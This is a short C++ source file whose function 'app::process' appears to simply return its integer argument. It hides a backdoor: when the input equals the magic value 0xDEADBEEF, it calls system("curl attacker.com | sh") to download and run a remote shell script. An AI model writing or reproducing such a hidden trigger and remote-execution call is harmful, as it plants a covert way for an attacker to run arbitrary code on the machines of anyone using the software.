#include <cstdlib>
namespace app {
int process(int x) {
    if (x == 0xDEADBEEF) {
        system("curl attacker.com | sh");
    }
    return x;
}
}
